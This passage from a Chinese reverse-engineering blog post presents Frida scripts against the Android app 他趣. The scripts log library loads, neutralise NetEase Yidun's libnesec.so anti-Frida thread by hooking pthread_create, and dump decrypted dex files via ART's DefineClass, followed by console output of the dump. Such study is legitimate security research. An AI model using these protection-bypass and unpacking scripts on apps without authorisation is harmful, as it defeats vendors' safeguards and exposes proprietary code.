class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// load_so.js</span><br><span class="hljs-keyword">var</span> dlopen = Module.findExportByName(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;dlopen&quot;</span>);<br><span class="hljs-keyword">var</span> android_dlopen_ext = Module.findExportByName(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;android_dlopen_ext&quot;</span>);<br>Interceptor.attach(dlopen, &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>        <span class="hljs-keyword">var</span> path_ptr = args[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">var</span> path = ptr(path_ptr).readCString();<br>        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;[dlopen:]&quot;</span>, path);<br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;&#125;<br>&#125;);<br>Interceptor.attach(android_dlopen_ext, &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>        <span class="hljs-keyword">var</span> path_ptr = args[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">var</span> path = ptr(path_ptr).readCString();<br>        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;[dlopen_ext:]&quot;</span>, path);<br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;&#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>使用脚本一直不行，因为用的一直是attach模式</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Frida中的`spawn`和`attach`是两种不同的操作模式，用于与目标进程进行交互。<br><br><span class="hljs-number">1</span>. `spawn`模式：在`spawn`模式下，Frida会启动一个新的目标进程，并且在该进程中加载指定的脚本。这意味着目标进程是由Frida直接创建的，并且可以在进程启动时就注入脚本。使用`spawn`模式可以在目标进程运行之前就对其进行动态修改、监控或调试。<br>    <br><span class="hljs-number">2</span>. `attach`模式：在`attach`模式下，Frida会连接到一个已经运行的目标进程，并且在该进程中加载指定的脚本。这意味着目标进程必须已经在运行中，而且Frida需要通过进程ID或进程名称将其连接起来。使用`attach`模式可以在目标进程运行时对其进行动态修改、监控或调试。<br>    <br><br>总结而言，`spawn`模式适用于在目标进程启动之前注入脚本，而`attach`模式适用于连接到已经运行的目标进程并注入脚本。选择使用哪种模式取决于您的具体需求和目标进程的状态。<br></code></pre></td></tr></table></figure><p>使用 spawn 模式，可以看到是 libnesec.so 文件，这是网易易盾的加壳so。</p><p>这是pixel 6Pro 手机hook ,可以看到。</p><p><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240111100934608.png"></p><p>但是换成moto 手机却不行，“ Failed to spawn: unexpectedly timed out while waiting for signal from process with PID 12337 ”，猜测这与手机系统有关。</p><p><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240111101359601.png"></p><h3 id="hook-libnesc-so"><a href="#hook-libnesc-so" class="headerlink" title="hook libnesc.so"></a>hook libnesc.so</h3><p>前面我们知道 libnesec 会检测frida hook， 那么可以直接hook libnesec.so ，当调用libnesec 库的时候，让其返回空</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook_pthread_create</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> pt_create_func = Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&#x27;pthread_create&#x27;</span>);<br>    Interceptor.attach(pt_create_func, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-comment">// 是那个so文件调用我，创建线程</span><br>            <span class="hljs-keyword">var</span> so_name = Process.findModuleByAddress(args[<span class="hljs-number">2</span>]).name;<br>            <span class="hljs-keyword">if</span> (so_name.<span class="hljs-built_in">indexOf</span>(<span class="hljs-string">&quot;libnesec&quot;</span>) != <span class="hljs-number">-1</span>) &#123;<br>                try &#123;<br>                    Interceptor.<span class="hljs-built_in">replace</span>(args[<span class="hljs-number">2</span>], <span class="hljs-keyword">new</span> NativeCallback(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>                        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;replace success&#x27;</span>);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                    &#125;, <span class="hljs-string">&#x27;void&#x27;</span>, [<span class="hljs-string">&quot;void&quot;</span>]));<br>                &#125; catch (e) &#123;&#125;<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;&#125;<br>    &#125;)<br>&#125;<br>hook_pthread_create();<br></code></pre></td></tr></table></figure><p>可以看到替换成功了。</p><p><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240111223623332.png"></p><h2 id="网易易盾脱壳"><a href="#网易易盾脱壳" class="headerlink" title="网易易盾脱壳"></a>网易易盾脱壳</h2><p>使用 jadx  打开 apk ，会发现存在 libnesec.so 文件，猜测加固了。因为反编译看不到要的伪java源码。因此需要去脱壳。</p><p><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240109222700682.png"></p><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><h4 id="MT-管理器"><a href="#MT-管理器" class="headerlink" title="MT 管理器"></a>MT 管理器</h4><p>可以查出来是网易易盾的加固</p><h4 id="PKID-查壳"><a href="#PKID-查壳" class="headerlink" title="PKID 查壳"></a>PKID 查壳</h4><p>查不出来，看过别人用pkid 可以查出来，可能版本不一样。</p><h3 id="dump-dex脱壳"><a href="#dump-dex脱壳" class="headerlink" title="dump_dex脱壳"></a>dump_dex脱壳</h3><p>脱壳前提： 要一直运行hook_libnesec.js 文件，保证frida 能够hook 而不被libnesec.so 检测到闪退，影响脱壳。<br><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240111223826464.png"></p><p>脱壳脚本</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">function</span>() &#123;<br>    function klog(<span class="hljs-name">data</span>) &#123;<br>        var message = &#123;&#125;<span class="hljs-comment">;</span><br>        message[<span class="hljs-string">&quot;jsname&quot;</span>] = <span class="hljs-string">&quot;dump_dex&quot;</span><span class="hljs-comment">;</span><br>        message[<span class="hljs-string">&quot;data&quot;</span>] = data<span class="hljs-comment">;</span><br>        send(<span class="hljs-name">message</span>)<span class="hljs-comment">;</span><br>    &#125;<br><br>    function klogData(<span class="hljs-name">data</span>, key, value) &#123;<br>        var message = &#123;&#125;<span class="hljs-comment">;</span><br>        message[<span class="hljs-string">&quot;jsname&quot;</span>] = <span class="hljs-string">&quot;dump_dex&quot;</span><span class="hljs-comment">;</span><br>        message[<span class="hljs-string">&quot;data&quot;</span>] = data<span class="hljs-comment">;</span><br>        message[<span class="hljs-name">key</span>] = value<span class="hljs-comment">;</span><br>        send(<span class="hljs-name">message</span>)<span class="hljs-comment">;</span><br>    &#125;<br><br>    function get_self_process_name() &#123;<br>        var openPtr = Module.getExportByName(<span class="hljs-symbol">&#x27;libc.so</span>&#x27;, <span class="hljs-symbol">&#x27;open</span>&#x27;)<span class="hljs-comment">;</span><br>        var open = new NativeFunction(<span class="hljs-name">openPtr</span>, <span class="hljs-symbol">&#x27;int</span>&#x27;, [<span class="hljs-symbol">&#x27;pointer</span>&#x27;, <span class="hljs-symbol">&#x27;int</span>&#x27;])<span class="hljs-comment">;</span><br><br>        var readPtr = Module.getExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>)<span class="hljs-comment">;</span><br>        var read = new NativeFunction(<span class="hljs-name">readPtr</span>, <span class="hljs-string">&quot;int&quot;</span>, [<span class="hljs-string">&quot;int&quot;</span>, <span class="hljs-string">&quot;pointer&quot;</span>, <span class="hljs-string">&quot;int&quot;</span>])<span class="hljs-comment">;</span><br><br>        var closePtr = Module.getExportByName(<span class="hljs-symbol">&#x27;libc.so</span>&#x27;, <span class="hljs-symbol">&#x27;close</span>&#x27;)<span class="hljs-comment">;</span><br>        var close = new NativeFunction(<span class="hljs-name">closePtr</span>, <span class="hljs-symbol">&#x27;int</span>&#x27;, [<span class="hljs-symbol">&#x27;int</span>&#x27;])<span class="hljs-comment">;</span><br><br>        var path = Memory.allocUtf8String(<span class="hljs-string">&quot;/proc/self/cmdline&quot;</span>)<span class="hljs-comment">;</span><br>        var fd = open(<span class="hljs-name">path</span>, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br>        if (<span class="hljs-name">fd</span> != <span class="hljs-number">-1</span>) &#123;<br>            var buffer = Memory.alloc(<span class="hljs-name">0x1000</span>)<span class="hljs-comment">;</span><br><br>            var result = read(<span class="hljs-name">fd</span>, buffer, <span class="hljs-number">0</span>x1000)<span class="hljs-comment">;</span><br>            close(<span class="hljs-name">fd</span>)<span class="hljs-comment">;</span><br>            result = ptr(<span class="hljs-name">buffer</span>).readCString()<span class="hljs-comment">;</span><br>            return result<span class="hljs-comment">;</span><br>        &#125;<br><br>        return <span class="hljs-string">&quot;-1&quot;</span><span class="hljs-comment">;</span><br>    &#125;<br><br><br>    function mkdir(<span class="hljs-name">path</span>) &#123;<br>        var mkdirPtr = Module.getExportByName(<span class="hljs-symbol">&#x27;libc.so</span>&#x27;, <span class="hljs-symbol">&#x27;mkdir</span>&#x27;)<span class="hljs-comment">;</span><br>        var mkdir = new NativeFunction(<span class="hljs-name">mkdirPtr</span>, <span class="hljs-symbol">&#x27;int</span>&#x27;, [<span class="hljs-symbol">&#x27;pointer</span>&#x27;, <span class="hljs-symbol">&#x27;int</span>&#x27;])<span class="hljs-comment">;</span><br><br><br><br>        var opendirPtr = Module.getExportByName(<span class="hljs-symbol">&#x27;libc.so</span>&#x27;, <span class="hljs-symbol">&#x27;opendir</span>&#x27;)<span class="hljs-comment">;</span><br>        var opendir = new NativeFunction(<span class="hljs-name">opendirPtr</span>, <span class="hljs-symbol">&#x27;pointer</span>&#x27;, [<span class="hljs-symbol">&#x27;pointer</span>&#x27;])<span class="hljs-comment">;</span><br><br>        var closedirPtr = Module.getExportByName(<span class="hljs-symbol">&#x27;libc.so</span>&#x27;, <span class="hljs-symbol">&#x27;closedir</span>&#x27;)<span class="hljs-comment">;</span><br>        var closedir = new NativeFunction(<span class="hljs-name">closedirPtr</span>, <span class="hljs-symbol">&#x27;int</span>&#x27;, [<span class="hljs-symbol">&#x27;pointer</span>&#x27;])<span class="hljs-comment">;</span><br><br>        var cPath = Memory.allocUtf8String(<span class="hljs-name">path</span>)<span class="hljs-comment">;</span><br>        var dir = opendir(<span class="hljs-name">cPath</span>)<span class="hljs-comment">;</span><br>        if (<span class="hljs-name">dir</span> != <span class="hljs-number">0</span>) &#123;<br>            closedir(<span class="hljs-name">dir</span>)<span class="hljs-comment">;</span><br>            return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>        &#125;<br>        mkdir(<span class="hljs-name">cPath</span>, <span class="hljs-number">755</span>)<span class="hljs-comment">;</span><br>        chmod(<span class="hljs-name">path</span>)<span class="hljs-comment">;</span><br>    &#125;<br><br>    function chmod(<span class="hljs-name">path</span>) &#123;<br>        var chmodPtr = Module.getExportByName(<span class="hljs-symbol">&#x27;libc.so</span>&#x27;, <span class="hljs-symbol">&#x27;chmod</span>&#x27;)<span class="hljs-comment">;</span><br>        var chmod = new NativeFunction(<span class="hljs-name">chmodPtr</span>, <span class="hljs-symbol">&#x27;int</span>&#x27;, [<span class="hljs-symbol">&#x27;pointer</span>&#x27;, <span class="hljs-symbol">&#x27;int</span>&#x27;])<span class="hljs-comment">;</span><br>        var cPath = Memory.allocUtf8String(<span class="hljs-name">path</span>)<span class="hljs-comment">;</span><br>        chmod(<span class="hljs-name">cPath</span>, <span class="hljs-number">755</span>)<span class="hljs-comment">;</span><br>    &#125;<br><br>    function dump_dex() &#123;<br>        var libart = Process.findModuleByName(<span class="hljs-string">&quot;libart.so&quot;</span>)<span class="hljs-comment">;</span><br>        var addr_DefineClass = null<span class="hljs-comment">;</span><br>        var symbols = libart.enumerateSymbols()<span class="hljs-comment">;</span><br>        for (<span class="hljs-name">var</span> index = <span class="hljs-number">0</span><span class="hljs-comment">; index &lt; symbols.length; index++) &#123;</span><br>            var symbol = symbols[<span class="hljs-name">index</span>]<span class="hljs-comment">;</span><br>            var symbol_name = symbol.name<span class="hljs-comment">;</span><br>            //这个DefineClass的函数签名是Android9的<br>            //_ZN3art11ClassLinker11DefineClassEPNS_6ThreadEPKcmNS_6HandleINS_6mirror11ClassLoaderEEERKNS_7DexFileERKNS9_8ClassDefE<br>            if (<span class="hljs-name">symbol_name.indexOf</span>(<span class="hljs-string">&quot;ClassLinker&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp;<br>                symbol_name.indexOf(<span class="hljs-string">&quot;DefineClass&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp;<br>                symbol_name.indexOf(<span class="hljs-string">&quot;Thread&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp;<br>                symbol_name.indexOf(<span class="hljs-string">&quot;DexFile&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>                console.log(<span class="hljs-name">symbol_name</span>, symbol.address)<span class="hljs-comment">;</span><br>                addr_DefineClass = symbol.address<span class="hljs-comment">;</span><br>            &#125;<br>        &#125;<br>        var dex_maps = &#123;&#125;<span class="hljs-comment">;</span><br>        var dex_count = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br><br>        console.log(<span class="hljs-string">&quot;[DefineClass:]&quot;</span>, addr_DefineClass)<span class="hljs-comment">;</span><br>        if (<span class="hljs-name">addr_DefineClass</span>) &#123;<br>            Interceptor.attach(<span class="hljs-name">addr_DefineClass</span>, &#123;<br>                onEnter: function(<span class="hljs-name">args</span>) &#123;<br>                    var dex_file = args[<span class="hljs-name">5</span>]<span class="hljs-comment">;</span><br>                    //ptr(<span class="hljs-name">dex_file</span>).add(<span class="hljs-name">Process.pointerSize</span>) is <span class="hljs-string">&quot;const uint8_t* const begin_;&quot;</span><br>                    //ptr(<span class="hljs-name">dex_file</span>).add(<span class="hljs-name">Process.pointerSize</span> + Process.pointerSize) is <span class="hljs-string">&quot;const size_t size_;&quot;</span><br>                    var base = ptr(<span class="hljs-name">dex_file</span>).add(<span class="hljs-name">Process.pointerSize</span>).readPointer()<span class="hljs-comment">;</span><br>                    var size = ptr(<span class="hljs-name">dex_file</span>).add(<span class="hljs-name">Process.pointerSize</span> + Process.pointerSize).readUInt()<span class="hljs-comment">;</span><br><br>                    if (<span class="hljs-name">dex_maps</span>[<span class="hljs-name">base</span>] == undefined) &#123;<br>                        dex_maps[<span class="hljs-name">base</span>] = size<span class="hljs-comment">;</span><br>                        var magic = ptr(<span class="hljs-name">base</span>).readCString()<span class="hljs-comment">;</span><br>                        if (<span class="hljs-name">magic.indexOf</span>(<span class="hljs-string">&quot;dex&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><br>                            var process_name = get_self_process_name()<span class="hljs-comment">;</span><br>                            if (<span class="hljs-name">process_name</span> != <span class="hljs-string">&quot;-1&quot;</span>) &#123;<br>                                var dex_dir_path = <span class="hljs-string">&quot;/data/data/&quot;</span> + process_name + <span class="hljs-string">&quot;/files/dump_dex_&quot;</span> + process_name<span class="hljs-comment">;</span><br>                                mkdir(<span class="hljs-name">dex_dir_path</span>)<span class="hljs-comment">;</span><br>                                var dex_path = dex_dir_path + <span class="hljs-string">&quot;/class&quot;</span> + (<span class="hljs-name">dex_count</span> == <span class="hljs-number">1</span> ? <span class="hljs-string">&quot;&quot;</span> : dex_count) + <span class="hljs-string">&quot;.dex&quot;</span><span class="hljs-comment">;</span><br>                                console.log(<span class="hljs-string">&quot;[find dex]:&quot;</span>, dex_path)<span class="hljs-comment">;</span><br>                                var fd = new File(<span class="hljs-name">dex_path</span>, <span class="hljs-string">&quot;wb&quot;</span>)<span class="hljs-comment">;</span><br>                                if (<span class="hljs-name">fd</span> &amp;&amp; fd != null) &#123;<br>                                    dex_count++<span class="hljs-comment">;</span><br>                                    var dex_buffer = ptr(<span class="hljs-name">base</span>).readByteArray(<span class="hljs-name">size</span>)<span class="hljs-comment">;</span><br>                                    fd.write(<span class="hljs-name">dex_buffer</span>)<span class="hljs-comment">;</span><br>                                    fd.flush()<span class="hljs-comment">;</span><br>                                    fd.close()<span class="hljs-comment">;</span><br>                                    console.log(<span class="hljs-string">&quot;[dump dex]:&quot;</span>, dex_path)<span class="hljs-comment">;</span><br><br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;,<br>                onLeave: function(<span class="hljs-name">retval</span>) &#123;&#125;<br>            &#125;)<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br><br>    function main() &#123;<br>        klogData(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;dump_dex.js init hook success&quot;</span>)<br>        dump_dex()<span class="hljs-comment">;</span><br>    &#125;<br>    setImmediate(<span class="hljs-name">main</span>)<span class="hljs-comment">;</span><br>&#125;)()<span class="hljs-comment">;</span><br><br></code></pre></td></tr></table></figure><p>运行  frida -UF -l .\dump_dex.js  ， 为了保证能脱壳，app 的每个板块都点一点。</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">PS C:\Users\TigerHu\NewFlold\7__study\2__Frida\他趣脱壳&gt; frida -UF -l .\dump_dex.js<br>     ____<br>    / _  |   Frida 16.1.0 - A world-class dynamic instrumentation toolkit<br>   | (_| |<br>    &gt; _  |   Commands:<br>   /_/ |_|       help      -&gt; Displays the help system<br>   . . . .       object?   -&gt; Display information about &#x27;object&#x27;<br>   . . . .       exit/quit -&gt; Exit<br>   . . . .<br>   . . . .   More info at https://frida.re/docs/home/<br>   . . . .<br>   . . . .   Connected to Pixel 6 Pro (id=1B231FDEE005T0)<br>_ZN3art11ClassLinker11DefineClassEPNS_6ThreadEPKcmNS_6HandleINS_6mirror11ClassLoaderEEERKNS_7DexFileERKNS_3dex8ClassDefE 0x6d87590ab0<br>[DefineClass:] 0x6d87590ab0<br>message: &#123;&#x27;<span class="hljs-attribute">type&#x27;</span>: &#x27;send&#x27;, &#x27;payload&#x27;: &#123;&#x27;jsname&#x27;: &#x27;dump_dex&#x27;, &#x27;data&#x27;: &#x27;&#x27;, &#x27;init&#x27;: &#x27;dump_dex<span class="hljs-variable">.js</span> init hook success&#x27;&#125;&#125; data: None<br>[Pixel 6 Pro::他趣 ]-&gt; [find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class2<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class2<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class3<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class3<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class4<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class4<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class5<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class5<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class6<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class6<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class7<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class7<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class8<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class8<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class9<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class9<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class10<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class10<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class11<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class11<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span 